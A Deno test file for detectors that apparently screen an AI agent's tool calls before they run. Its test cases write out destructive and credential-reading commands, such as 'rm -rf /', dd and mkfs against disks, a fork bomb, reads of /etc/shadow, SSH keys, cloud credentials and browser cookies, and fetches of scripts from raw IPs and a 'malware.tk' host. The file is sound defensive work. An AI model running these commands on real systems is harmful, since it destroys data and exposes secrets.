#!/usr/bin/env -S deno test --allow-read

import { assertEquals } from "https://deno.land/std@0.224.0/assert/assert_equals.ts";
import { assertFalse } from "https://deno.land/std@0.224.0/assert/assert_false.ts";
import { assert } from "https://deno.land/std@0.224.0/assert/assert.ts";

// Import all detectors
import {
  isDangerousRmCommand,
  isIndirectRm,
  scriptContainsRm,
} from "./pre_tool_use/detectors/rm-command.ts";
import { isFileDeletionAttempt } from "./pre_tool_use/detectors/file-deletion.ts";
import { isEnvFileAccess } from "./pre_tool_use/detectors/env-file.ts";
import { isDangerousSystemOperation } from "./pre_tool_use/detectors/system-operations.ts";
import { isNetworkOperation } from "./pre_tool_use/detectors/network-operations.ts";
import { isEmailOperation } from "./pre_tool_use/detectors/email-operations.ts";
import { isDangerousPermissionOperation } from "./pre_tool_use/detectors/permission-operations.ts";
import { isUserManagementOperation } from "./pre_tool_use/detectors/user-management.ts";
import { isSystemControlOperation } from "./pre_tool_use/detectors/system-control.ts";
import { isForkBomb } from "./pre_tool_use/detectors/fork-bomb.ts";
import { isSensitiveFileAccess } from "./pre_tool_use/detectors/sensitive-files.ts";

// ===== RM COMMAND TESTS =====
Deno.test("rm-command: detects dangerous rm -rf variations", () => {
  // Should block
  assert(isDangerousRmCommand("rm -rf /"));
  assert(isDangerousRmCommand("rm -rf /*"));
  assert(isDangerousRmCommand("rm -fr /home"));
  assert(isDangerousRmCommand("rm -Rf /"));
  assert(isDangerousRmCommand("rm --recursive --force /"));
  assert(isDangerousRmCommand("rm --force --recursive /"));
  assert(isDangerousRmCommand("rm -r / -f"));
  assert(isDangerousRmCommand("rm -f / -r"));
  assert(isDangerousRmCommand("rm -rf ~"));
  assert(isDangerousRmCommand("rm -rf ~/"));
  assert(isDangerousRmCommand("rm -rf $HOME"));
  assert(isDangerousRmCommand("rm -rf .."));
  assert(isDangerousRmCommand("rm -rf *"));
  assert(isDangerousRmCommand("rm -rf ."));

  // Should allow
  assertFalse(isDangerousRmCommand("rm file.txt"));
  assertFalse(isDangerousRmCommand("rm -f file.txt"));
  assertFalse(isDangerousRmCommand("rm -r folder"));
  // Note: rm -rf with specific paths is still dangerous, so we expect it to be blocked
  assert(isDangerousRmCommand("rm -rf specific-folder"));
});

Deno.test("rm-command: detects indirect rm via bash -c", async () => {
  // Should detect rm in bash -c
  assert(await isIndirectRm("bash -c 'rm -rf /'"));
  assert(await isIndirectRm("sh -c 'rm file.txt'"));
  assert(await isIndirectRm('bash -c "rm -rf *"'));

  // Should not detect when no rm
  assertFalse(await isIndirectRm("bash -c 'echo hello'"));
  assertFalse(await isIndirectRm("ls -la"));
});

// ===== FILE DELETION TESTS =====
Deno.test("file-deletion: detects various deletion methods", () => {
  // Should block
  assert(isFileDeletionAttempt("unlink file.txt"));
  assert(isFileDeletionAttempt("> important.txt"));
  assert(isFileDeletionAttempt(": > data.log"));
  assert(isFileDeletionAttempt("perl -e 'unlink \"file.txt\"'"));
  assert(isFileDeletionAttempt("python -c 'os.unlink(\"file.txt\")'"));
  assert(isFileDeletionAttempt("python3 -c 'os.remove(\"file.txt\")'"));
  assert(isFileDeletionAttempt("ruby -e 'File.delete(\"file.txt\")'"));
  assert(isFileDeletionAttempt("truncate -s 0 file.txt"));
  assert(isFileDeletionAttempt("dd if=/dev/null of=file.txt"));
  assert(isFileDeletionAttempt("cp /dev/null file.txt"));
  assert(isFileDeletionAttempt("sed -i 'd' file.txt"));
  assert(isFileDeletionAttempt('sed -i "d" file.txt'));

  // Should allow normal operations
  assertFalse(isFileDeletionAttempt("echo 'content' >> file.txt")); // append is OK
  assertFalse(isFileDeletionAttempt("cat file.txt"));
  assertFalse(isFileDeletionAttempt("sed -i 's/old/new/' file.txt"));

  // Note: These are actually blocked by our truncation pattern
  assert(isFileDeletionAttempt("echo 'content' > file.txt")); // This truncates the file
});

Deno.test("file-deletion: smart find -delete handling", () => {
  // Should allow in current directory
  assertFalse(isFileDeletionAttempt('find . -name "*.tmp" -delete'));
  assertFalse(isFileDeletionAttempt("find ./build -delete"));
  assertFalse(isFileDeletionAttempt("find mydir -delete"));

  // Should block dangerous paths
  assert(isFileDeletionAttempt("find / -delete"));
  assert(isFileDeletionAttempt('find / -name "*.log" -delete'));
  assert(isFileDeletionAttempt("find .. -delete"));
  assert(isFileDeletionAttempt("find ~ -delete"));
  assert(isFileDeletionAttempt("find $HOME -delete"));
  assert(isFileDeletionAttempt("find ${HOME} -delete"));
  assert(isFileDeletionAttempt("find /etc -name '*.conf' -delete"));
});

// ===== ENV FILE ACCESS TESTS =====
Deno.test("env-file: detects Glob tool searching for .env", () => {
  // Should block
  assert(isEnvFileAccess("Glob", { pattern: "**/.env" }));
  assert(isEnvFileAccess("Glob", { pattern: "**/.env*" }));
  assert(isEnvFileAccess("Glob", { pattern: ".env.local" }));

  // Should allow .env.sample
  assertFalse(isEnvFileAccess("Glob", { pattern: ".env.sample" }));
  assertFalse(isEnvFileAccess("Glob", { pattern: "**/.env.sample" }));
});

Deno.test("env-file: detects Task tool searching for env files", () => {
  // Should block
  assert(isEnvFileAccess("Task", {
    prompt: "Search for environment files",
    description: "Find env files",
  }));
  assert(isEnvFileAccess("Task", {
    prompt: "Look for .env files",
  }));
  assert(isEnvFileAccess("Task", {
    description: "Search for env variables",
    prompt: "Find environment variable files",
  }));

  // Should allow unrelated tasks
  assertFalse(isEnvFileAccess("Task", {
    prompt: "Search for README files",
  }));
});

Deno.test("env-file: detects Read/Write operations on .env", () => {
  // Should block
  assert(isEnvFileAccess("Read", { file_path: ".env" }));
  assert(isEnvFileAccess("Read", { file_path: "/path/to/.env" }));
  assert(isEnvFileAccess("Read", { file_path: ".env.local" }));
  assert(isEnvFileAccess("Write", { file_path: ".env.production" }));
  assert(isEnvFileAccess("Edit", { file_path: ".env.development" }));

  // Should allow .env.sample
  assertFalse(isEnvFileAccess("Read", { file_path: ".env.sample" }));
  assertFalse(isEnvFileAccess("Write", { file_path: ".env.sample" }));
});

Deno.test("env-file: detects Bash commands accessing .env", () => {
  // Should block
  assert(isEnvFileAccess("Bash", { command: "cat .env" }));
  assert(isEnvFileAccess("Bash", { command: "echo SECRET > .env" }));
  assert(isEnvFileAccess("Bash", { command: "touch .env.local" }));
  assert(isEnvFileAccess("Bash", { command: "cp .env .env.backup" }));
  assert(isEnvFileAccess("Bash", { command: "mv .env.old .env" }));
  assert(isEnvFileAccess("Bash", { command: 'find . -name ".env*"' }));
  assert(isEnvFileAccess("Bash", { command: "ls -la | grep .env" }));

  // Should allow .env.sample
  assertFalse(isEnvFileAccess("Bash", { command: "cat .env.sample" }));
  assertFalse(isEnvFileAccess("Bash", { command: "cp .env.sample backup.env.sample" }));

  // Should allow unrelated commands
  assertFalse(isEnvFileAccess("Bash", { command: "ls -la" }));
  assertFalse(isEnvFileAccess("Bash", { command: "echo hello" }));
});

// ===== SYSTEM OPERATIONS TESTS =====
Deno.test("system-operations: detects file shredding commands", () => {
  // Should block
  assert(isDangerousSystemOperation("shred /etc/passwd"));
  assert(isDangerousSystemOperation("shred -vfz file.txt"));
  assert(isDangerousSystemOperation("wipe -rf /home/user"));
  assert(isDangerousSystemOperation("scrub /dev/sda"));
  assert(isDangerousSystemOperation("blkdiscard /dev/nvme0n1"));

  // Should allow normal operations
  assertFalse(isDangerousSystemOperation("rm file.txt"));
  assertFalse(isDangerousSystemOperation("delete record from table"));
});

Deno.test("system-operations: detects disk device operations", () => {
  // Should block
  assert(isDangerousSystemOperation("dd if=/dev/zero of=/dev/sda"));
  assert(isDangerousSystemOperation("dd of=/dev/sdb1 if=backup.img"));
  assert(isDangerousSystemOperation("echo test > /dev/sda"));
  assert(isDangerousSystemOperation("cat data >> /dev/hda"));
  assert(isDangerousSystemOperation("cp file.txt /dev/sdc"));

  // dd to dangerous system locations
  assert(isDangerousSystemOperation("dd if=file of=/boot/vmlinuz"));
  assert(isDangerousSystemOperation("dd if=data of=/etc/passwd"));

  // Should allow safe dd operations
  assertFalse(isDangerousSystemOperation("dd if=input.txt of=output.txt"));
  assertFalse(isDangerousSystemOperation("dd if=/dev/urandom of=/tmp/random.dat bs=1M count=1"));
  assertFalse(isDangerousSystemOperation("dd if=/dev/zero of=/home/user/file.img bs=1M count=100"));
  assertFalse(isDangerousSystemOperation("dd if=backup.img of=restore.img"));
});

Deno.test("system-operations: detects filesystem formatting", () => {
  // Should block
  assert(isDangerousSystemOperation("mkfs.ext4 /dev/sda1"));
  assert(isDangerousSystemOperation("mkfs.xfs /dev/nvme0n1p2"));
  assert(isDangerousSystemOperation("mkfs.btrfs /dev/sdb"));
  assert(isDangerousSystemOperation("mke2fs /dev/sda1"));
  assert(isDangerousSystemOperation("mkswap /dev/sda2"));
  assert(isDangerousSystemOperation("mkdosfs /dev/sdc1"));
  assert(isDangerousSystemOperation("mkvfat /dev/usb"));

  // Should allow
  assertFalse(isDangerousSystemOperation("mkdir newfolder"));
  assertFalse(isDangerousSystemOperation("make all"));
});

Deno.test("system-operations: detects partition manipulation", () => {
  // Should block
  assert(isDangerousSystemOperation("fdisk /dev/sda"));
  assert(isDangerousSystemOperation("parted /dev/sdb"));
  assert(isDangerousSystemOperation("gparted"));
  assert(isDangerousSystemOperation("sfdisk /dev/sdc"));
  assert(isDangerousSystemOperation("gdisk /dev/nvme0n1"));
  assert(isDangerousSystemOperation("sgdisk -n 1:0:+100G /dev/sda"));
  assert(isDangerousSystemOperation("cfdisk /dev/sdb"));
  assert(isDangerousSystemOperation("partprobe /dev/sda"));
  assert(isDangerousSystemOperation("partx -a /dev/sdb"));

  // Should allow
  assertFalse(isDangerousSystemOperation("ls /dev/"));
  assertFalse(isDangerousSystemOperation("df -h"));
});

Deno.test("system-operations: detects bootloader operations", () => {
  // Should block
  assert(isDangerousSystemOperation("grub-install /dev/sda"));
  assert(isDangerousSystemOperation("update-grub"));
  assert(isDangerousSystemOperation("efibootmgr -c"));
  assert(isDangerousSystemOperation("bootctl install"));

  // Should allow
  assertFalse(isDangerousSystemOperation("ls /boot"));
  assertFalse(isDangerousSystemOperation("cat /boot/grub/grub.cfg"));
});

// ===== NETWORK OPERATIONS TESTS =====
Deno.test("network-operations: detects SSH and related tools", () => {
  // Should block
  assert(isNetworkOperation("ssh user@host"));
  assert(isNetworkOperation("scp file.txt user@host:"));
  assert(isNetworkOperation("sftp user@host"));
  assert(isNetworkOperation("rsync -av /local/ user@host:/remote/"));
  assert(isNetworkOperation("ssh-copy-id user@host"));
  assert(isNetworkOperation("ssh-keygen -f /etc/ssh/ssh_host_rsa_key"));

  // Should allow local operations
  assertFalse(isNetworkOperation("ls -la"));
  assertFalse(isNetworkOperation("cp file1 file2"));
});

Deno.test("network-operations: detects insecure protocols", () => {
  // Should block
  assert(isNetworkOperation("telnet host 23"));
  assert(isNetworkOperation("ftp ftp.example.com"));
  assert(isNetworkOperation("rlogin remote"));
  assert(isNetworkOperation("rsh host command"));
  assert(isNetworkOperation("rexec host command"));

  // Should block sftp (it's still a network operation)
  assert(isNetworkOperation("sftp user@host"));

  // Should allow non-network commands
  assertFalse(isNetworkOperation("echo 'hello world'"));
});

Deno.test("network-operations: detects advanced networking tools", () => {
  // Should block
  assert(isNetworkOperation("socat TCP:host:80 -"));
  assert(isNetworkOperation("openssl s_client -connect host:443"));
  assert(isNetworkOperation("nc -l 1234"));
  assert(isNetworkOperation("netcat host 80"));
  assert(isNetworkOperation("ncat --ssl host 443"));
  assert(isNetworkOperation("cryptcat -l -p 1234"));

  // Should block network scanning
  assert(isNetworkOperation("nmap -sS 192.168.1.0/24"));
  assert(isNetworkOperation("masscan 0.0.0.0/0 -p80"));
  assert(isNetworkOperation("zmap -p 80 192.168.1.0/24"));
  assert(isNetworkOperation("hping3 -S host"));
  assert(isNetworkOperation("tcpdump -i eth0"));
  assert(isNetworkOperation("wireshark"));
  assert(isNetworkOperation("tshark -i any"));
});

Deno.test("network-operations: detects suspicious curl/wget usage", () => {
  // Should block
  assert(isNetworkOperation("curl 192.168.1.100"));
  assert(isNetworkOperation("wget http://123.45.67.89/script.sh"));
  assert(isNetworkOperation("curl http://malware.tk/payload"));
  assert(isNetworkOperation("wget https://bit.ly/2xY3zW"));
  assert(isNetworkOperation("curl pastebin.com/raw/abc123"));

  // Should allow normal usage
  assertFalse(isNetworkOperation("curl https://api.github.com"));
  assertFalse(isNetworkOperation("wget https://example.com/file.zip"));
});

// ===== EMAIL OPERATIONS TESTS =====
Deno.test("email-operations: detects email sending commands", () => {
  // Should block
  assert(isEmailOperation("mail user@example.com"));
  assert(isEmailOperation("mailx -s 'Subject' user@example.com"));
  assert(isEmailOperation("sendmail user@example.com"));
  assert(isEmailOperation("postfix reload"));
  assert(isEmailOperation("exim -bp"));
  assert(isEmailOperation("mutt -s 'Subject' user@example.com"));
  assert(isEmailOperation("msmtp user@example.com"));
  assert(isEmailOperation("ssmtp user@example.com"));
  assert(isEmailOperation("swaks --to user@example.com"));
  assert(isEmailOperation("sendemail -t user@example.com"));

  // Should allow
  assertFalse(isEmailOperation("echo 'hello world'"));
  assertFalse(isEmailOperation("cat readme.txt"));
});

Deno.test("email-operations: detects SMTP connections", () => {
  // Should block
  assert(isEmailOperation("telnet smtp.gmail.com 25"));
  assert(isEmailOperation("nc mail.server.com 587"));
  assert(isEmailOperation("openssl s_client -connect smtp.gmail.com:465"));
  assert(isEmailOperation("python -c 'import smtplib'"));
  assert(isEmailOperation("perl -e 'use Net::SMTP'"));
  assert(isEmailOperation("php -r 'mail(\"test@example.com\", \"subject\", \"body\");'"));
  assert(isEmailOperation("ruby -e 'require \"net/smtp\"'"));

  // Should allow
  assertFalse(isEmailOperation("telnet host 80"));
  assertFalse(isEmailOperation("nc host 443"));
});

// ===== PERMISSION OPERATIONS TESTS =====
Deno.test("permission-operations: detects dangerous chmod", () => {
  // Should block
  assert(isDangerousPermissionOperation("chmod -R 777 /"));
  assert(isDangerousPermissionOperation("chmod -R 000 /etc"));
  assert(isDangerousPermissionOperation("chmod -R 777 /usr"));
  assert(isDangerousPermissionOperation("chmod -R 777 .."));
  assert(isDangerousPermissionOperation("chmod -R 777 ~"));
  assert(isDangerousPermissionOperation("chmod 777 /"));
  assert(isDangerousPermissionOperation("chmod -R 666 /var"));
  assert(isDangerousPermissionOperation("chmod 666 *"));

  // Should allow
  assertFalse(isDangerousPermissionOperation("chmod 755 script.sh"));
  assertFalse(isDangerousPermissionOperation("chmod -R 755 myproject"));
  assertFalse(isDangerousPermissionOperation("chmod -R 777 /tmp/mydir"));
  assertFalse(isDangerousPermissionOperation("chmod -R 777 /var/tmp/test"));
});

Deno.test("permission-operations: detects dangerous chown", () => {
  // Should block
  assert(isDangerousPermissionOperation("chown -R root:root /"));
  assert(isDangerousPermissionOperation("chown -R user /etc"));
  assert(isDangerousPermissionOperation("chown -R user:group /usr"));
  assert(isDangerousPermissionOperation("chown -R nobody /bin"));
  assert(isDangerousPermissionOperation("chown -R user .."));
  assert(isDangerousPermissionOperation("chown root:root /home/user"));

  // Should allow
  assertFalse(isDangerousPermissionOperation("chown user:group file.txt"));
  assertFalse(isDangerousPermissionOperation("chown -R user:group /home/user/project"));
  assertFalse(isDangerousPermissionOperation("chown user /tmp/file"));
});

Deno.test("permission-operations: detects dangerous chgrp", () => {
  // Should block any recursive chgrp
  assert(isDangerousPermissionOperation("chgrp -R group /"));
  assert(isDangerousPermissionOperation("chgrp -R wheel /etc"));
  assert(isDangerousPermissionOperation("chgrp -R users /home"));

  // Should allow non-recursive
  assertFalse(isDangerousPermissionOperation("chgrp group file.txt"));
  assertFalse(isDangerousPermissionOperation("chgrp wheel script.sh"));
});

// ===== USER MANAGEMENT TESTS =====
Deno.test("user-management: detects user modification commands", () => {
  // Should block
  assert(isUserManagementOperation("passwd"));
  assert(isUserManagementOperation("passwd user"));
  assert(isUserManagementOperation("usermod -L user"));
  assert(isUserManagementOperation("useradd newuser"));
  assert(isUserManagementOperation("userdel olduser"));
  assert(isUserManagementOperation("adduser newuser"));
  assert(isUserManagementOperation("deluser olduser"));
  assert(isUserManagementOperation("groupadd newgroup"));
  assert(isUserManagementOperation("groupdel oldgroup"));
  assert(isUserManagementOperation("groupmod -n newname oldname"));
  assert(isUserManagementOperation("gpasswd group"));
  assert(isUserManagementOperation("chage -E 2024-12-31 user"));

  // Should allow
  assertFalse(isUserManagementOperation("echo passwd"));
  assertFalse(isUserManagementOperation("cat /etc/passwd"));
});

Deno.test("user-management: detects shadow file manipulation", () => {
  // Should block
  assert(isUserManagementOperation("vipw"));
  assert(isUserManagementOperation("vigr"));
  assert(isUserManagementOperation("pwck"));
  assert(isUserManagementOperation("grpck"));
  assert(isUserManagementOperation("pwconv"));
  assert(isUserManagementOperation("pwunconv"));
  assert(isUserManagementOperation("grpconv"));
  assert(isUserManagementOperation("grpunconv"));
  assert(isUserManagementOperation("echo 'user:pass' >> /etc/passwd"));
  assert(isUserManagementOperation("sed -i 's/user/newuser/' /etc/passwd"));

  // Should allow
  assertFalse(isUserManagementOperation("cat /etc/passwd"));
  assertFalse(isUserManagementOperation("grep user /etc/passwd"));
});

// ===== SYSTEM CONTROL TESTS =====
Deno.test("system-control: detects shutdown/reboot commands", () => {
  // Should block
  assert(isSystemControlOperation("reboot"));
  assert(isSystemControlOperation("shutdown -h now"));
  assert(isSystemControlOperation("halt"));
  assert(isSystemControlOperation("poweroff"));
  assert(isSystemControlOperation("init 0"));
  assert(isSystemControlOperation("init 6"));
  assert(isSystemControlOperation("telinit 0"));
  assert(isSystemControlOperation("systemctl reboot"));
  assert(isSystemControlOperation("systemctl poweroff"));
  assert(isSystemControlOperation("/sbin/reboot"));

  // Should allow
  assertFalse(isSystemControlOperation("echo reboot"));
  assertFalse(isSystemControlOperation("cat /var/log/reboot.log"));
});

Deno.test("system-control: detects service management", () => {
  // Should block
  assert(isSystemControlOperation("systemctl start nginx"));
  assert(isSystemControlOperation("systemctl stop mysql"));
  assert(isSystemControlOperation("systemctl restart apache2"));
  assert(isSystemControlOperation("systemctl enable ssh"));
  assert(isSystemControlOperation("systemctl disable firewall"));
  assert(isSystemControlOperation("service nginx start"));
  assert(isSystemControlOperation("service mysql stop"));
  assert(isSystemControlOperation("/etc/init.d/apache2 restart"));
  assert(isSystemControlOperation("chkconfig nginx on"));
  assert(isSystemControlOperation("update-rc.d nginx enable"));

  // Should allow status checks
  assertFalse(isSystemControlOperation("systemctl status nginx"));
  assertFalse(isSystemControlOperation("service nginx status"));
});

Deno.test("system-control: detects scheduled task modifications", () => {
  // Should block
  assert(isSystemControlOperation("crontab -e"));
  assert(isSystemControlOperation("crontab -r"));
  assert(isSystemControlOperation("crontab newcron"));
  assert(isSystemControlOperation("at 2pm"));
  assert(isSystemControlOperation("atq"));
  assert(isSystemControlOperation("atrm 5"));
  assert(isSystemControlOperation("batch"));
  assert(isSystemControlOperation("echo '* * * * * cmd' > /etc/cron.d/job"));
  assert(isSystemControlOperation("systemctl enable my.timer"));

  // Should allow viewing
  assertFalse(isSystemControlOperation("crontab -l"));
  assertFalse(isSystemControlOperation("ls /etc/cron.d/"));
});

Deno.test("system-control: detects firewall modifications", () => {
  // Should block
  assert(isSystemControlOperation("iptables -A INPUT -j DROP"));
  assert(isSystemControlOperation("iptables -F"));
  assert(isSystemControlOperation("ip6tables -P INPUT DROP"));
  assert(isSystemControlOperation("ufw enable"));
  assert(isSystemControlOperation("ufw deny 22"));
  assert(isSystemControlOperation("firewall-cmd --add-service=http"));
  assert(isSystemControlOperation("nftables -f /etc/nftables.conf"));
  assert(isSystemControlOperation("pfctl -e"));

  // Should allow viewing
  assertFalse(isSystemControlOperation("iptables -L"));
  assertFalse(isSystemControlOperation("ufw status"));
});

Deno.test("system-control: detects filesystem mounting", () => {
  // Should block
  assert(isSystemControlOperation("mount /dev/sda1 /mnt"));
  assert(isSystemControlOperation("umount /mnt"));
  assert(isSystemControlOperation("mount -o remount,rw /"));
  assert(isSystemControlOperation("echo '/dev/sda1 /mnt ext4' >> /etc/fstab"));
  assert(isSystemControlOperation("losetup /dev/loop0 disk.img"));
  assert(isSystemControlOperation("swapon /dev/sda2"));
  assert(isSystemControlOperation("swapoff -a"));

  // Should allow viewing
  assertFalse(isSystemControlOperation("mount"));
  assertFalse(isSystemControlOperation("df -h"));
  assertFalse(isSystemControlOperation("findmnt"));
});

// ===== FORK BOMB TESTS =====
Deno.test("fork-bomb: detects classic fork bomb", () => {
  // Should block classic patterns
  assert(isForkBomb(":(){ :|:& };:"));
  assert(isForkBomb(":() { : | : & } ; :"));
  assert(isForkBomb(": ( ) { : | : & } ; :"));

  // Should block variations
  assert(isForkBomb("$0 & $0 &"));
  assert(isForkBomb(". $0 | . $0 &"));
  assert(isForkBomb("fork while fork"));
  assert(isForkBomb("fork for fork"));
  assert(isForkBomb("while True: fork()"));
  assert(isForkBomb("while 1: os.fork()"));

  // Should block excessive background processes
  assert(isForkBomb("cmd & cmd & cmd & cmd & cmd & cmd & cmd & cmd & cmd & cmd & cmd &"));

  // Should allow normal commands
  assertFalse(isForkBomb("echo hello"));
  assertFalse(isForkBomb("ls -la &"));
  assertFalse(isForkBomb("sleep 10 & echo done"));
});

// ===== SENSITIVE FILES TESTS =====
Deno.test("sensitive-files: detects system credential file access", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", { file_path: "/etc/shadow" }));
  assert(isSensitiveFileAccess("Read", { file_path: "/etc/gshadow" }));
  assert(isSensitiveFileAccess("Read", { file_path: "/etc/master.passwd" }));
  assert(isSensitiveFileAccess("Bash", { command: "cat /etc/shadow" }));
  assert(isSensitiveFileAccess("Bash", { command: "less /etc/gshadow" }));

  // Should allow /etc/passwd with .sample
  assertFalse(isSensitiveFileAccess("Read", { file_path: "/etc/passwd.sample" }));
});

Deno.test("sensitive-files: detects SSH key access", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", { file_path: "~/.ssh/id_rsa" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.ssh/id_ed25519" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.ssh/id_ecdsa_sk" }));
  assert(isSensitiveFileAccess("Read", { file_path: "/home/user/.ssh/authorized_keys" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.ssh/config" }));
  assert(isSensitiveFileAccess("Bash", { command: "cat ~/.ssh/id_rsa" }));
  assert(isSensitiveFileAccess("Bash", { command: "cp ~/.ssh/id_ed25519 /tmp/" }));

  // Should block .pub files too (they're still sensitive)
  assert(isSensitiveFileAccess("Read", { file_path: "~/.ssh/id_rsa.pub" }));
});

Deno.test("sensitive-files: detects cloud credential access", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", { file_path: "~/.aws/credentials" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.aws/config" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.kube/config" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.docker/config.json" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.gcp/credentials.json" }));
  assert(isSensitiveFileAccess("Bash", { command: "cat ~/.aws/credentials" }));
  assert(isSensitiveFileAccess("Bash", { command: "grep key ~/.boto" }));
});

Deno.test("sensitive-files: detects certificate and key files", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", { file_path: "server.pem" }));
  assert(isSensitiveFileAccess("Read", { file_path: "private.key" }));
  assert(isSensitiveFileAccess("Read", { file_path: "cert.pfx" }));
  assert(isSensitiveFileAccess("Read", { file_path: "keystore.p12" }));
  assert(isSensitiveFileAccess("Read", { file_path: "/etc/ssl/private/server.key" }));
  assert(isSensitiveFileAccess("Bash", { command: "cat private_key.pem" }));
  assert(isSensitiveFileAccess("Bash", { command: "openssl rsa -in server.key" }));
});

Deno.test("sensitive-files: detects browser data access", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", {
    file_path: "~/.mozilla/firefox/profile/key4.db"
  }));
  assert(isSensitiveFileAccess("Read", {
    file_path: "~/.mozilla/firefox/profile/logins.json"
  }));
  assert(isSensitiveFileAccess("Read", {
    file_path: "~/Library/Application Support/Google/Chrome/Default/Cookies"
  }));
  assert(isSensitiveFileAccess("Read", {
    file_path: "~/.config/google-chrome/Default/Login Data"
  }));
  assert(isSensitiveFileAccess("Bash", {
    command: "sqlite3 ~/.mozilla/firefox/*/cookies.sqlite"
  }));
});

Deno.test("sensitive-files: detects history file access", () => {
  // Should block
  assert(isSensitiveFileAccess("Read", { file_path: "~/.bash_history" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.zsh_history" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.mysql_history" }));
  assert(isSensitiveFileAccess("Read", { file_path: "~/.psql_history" }));
  assert(isSensitiveFileAccess("Bash", { command: "history" }));
  assert(isSensitiveFileAccess("Bash", { command: "cat ~/.bash_history" }));
  assert(isSensitiveFileAccess("Bash", { command: "tail -n 50 ~/.zsh_history" }));
});

Deno.test("sensitive-files: detects sensitive glob patterns", () => {
  // Should block
  assert(isSensitiveFileAccess("Glob", { pattern: "**/*.pem" }));
  assert(isSensitiveFileAccess("Glob", { pattern: "**/*.key" }));
  assert(isSensitiveFileAccess("Glob", { pattern: "**/id_rsa" }));
  assert(isSensitiveFileAccess("Glob", { pattern: "**/.ssh/*" }));
  assert(isSensitiveFileAccess("Glob", { pattern: "**/*credential*" }));
  assert(isSensitiveFileAccess("Glob", { pattern: "*history" }));

  // Should allow non-sensitive patterns
  assertFalse(isSensitiveFileAccess("Glob", { pattern: "**/*.js" }));
  assertFalse(isSensitiveFileAccess("Glob", { pattern: "**/*.txt" }));
});

Deno.test("sensitive-files: detects sensitive grep searches", () => {
  // Should block searching for passwords in non-tmp directories
  assert(isSensitiveFileAccess("Grep", {
    pattern: "password",
    path: "/home"
  }));
  assert(isSensitiveFileAccess("Grep", {
    pattern: "api_key",
    path: "."
  }));

  // Should allow in tmp directories
  assertFalse(isSensitiveFileAccess("Grep", {
    pattern: "password",
    path: "/tmp"
  }));
  assertFalse(isSensitiveFileAccess("Grep", {
    pattern: "secret",
    path: "/var/tmp"
  }));

  // Should block searching in sensitive locations
  assert(isSensitiveFileAccess("Grep", {
    pattern: "test",
    path: "~/.ssh"
  }));
});

// ===== INTEGRATION TESTS =====
Deno.test("integration: multiple detectors work together", () => {
  // Test that each detector works independently
  const bashCommand = {
    tool_name: "Bash",
    tool_input: { command: "rm -rf /" },
  };

  // This would be blocked by rm detector
  assert(isDangerousRmCommand("rm -rf /"));

  // Env file access
  const envAccess = {
    tool_name: "Read",
    tool_input: { file_path: ".env" },
  };
  assert(isEnvFileAccess("Read", { file_path: ".env" }));

  // System operations
  assert(isDangerousSystemOperation("mkfs.ext4 /dev/sda1"));

  // File deletion
  assert(isFileDeletionAttempt("find / -delete"));

  // Network operations
  assert(isNetworkOperation("ssh user@host"));

  // Email operations
  assert(isEmailOperation("sendmail user@example.com"));

  // Permission operations
  assert(isDangerousPermissionOperation("chmod -R 777 /"));

  // User management
  assert(isUserManagementOperation("passwd root"));

  // System control
  assert(isSystemControlOperation("reboot"));

  // Fork bomb
  assert(isForkBomb(":(){ :|:& };:"));

  // Sensitive files
  assert(isSensitiveFileAccess("Read", { file_path: "/etc/shadow" }));
});

// Run tests with: deno test pre_tool_use_test.ts --allow-read
